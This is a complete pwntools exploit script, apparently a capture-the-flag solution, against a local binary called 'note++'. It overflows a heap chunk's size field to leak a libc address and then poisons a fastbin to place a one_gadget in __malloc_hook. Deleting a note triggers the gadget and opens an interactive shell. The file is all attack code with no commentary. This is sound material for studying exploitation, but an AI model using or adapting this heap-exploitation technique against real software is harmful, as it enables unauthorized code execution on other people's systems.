from pwn import *

p = process('./note++')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, note, describe):
    p.sendlineafter('>', '1')
    p.sendlineafter(': ', str(size))
    p.sendafter(': ', note)
    p.sendlineafter(': ', describe)

def show():
    p.sendlineafter('>', '2')

def delete(index):
    p.sendlineafter('>', '3')
    p.sendlineafter(': ', str(index))

add(0x18, 'aaaa', 'AAAA')
add(0x60, 'bbbb', 'AAAA')
add(0x60, 'cccc', 'AAAA')
add(0x60, 'cccc', 'AAAA')
delete(0)
add(0, b'a'*24 + p64(0xe1), 'AAAA')
delete(1)
add(0x60, 'a'*8, 'AAAA')
show()
p.recvuntil('2:')
p.recvuntil('Data: ')
base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c4b78
success('libc base = 0x%x', base)
delete(1)
delete(0)
malloc_hook = libc.symbols['__malloc_hook'] + base
system = libc.symbols['system'] + base
one_gadget = base + 0xf0364
add(0, b'a'*0x18+p64(0x71)+p64(malloc_hook - 0x10 -19), 'AAAA')
add(0x60, 'aaaa', 'AAAA')
add(0x60, b'a'*19+p64(one_gadget), 'AAAA')
p.sendlineafter('>', '3')
p.sendlineafter(': ', '4')

p.interactive()
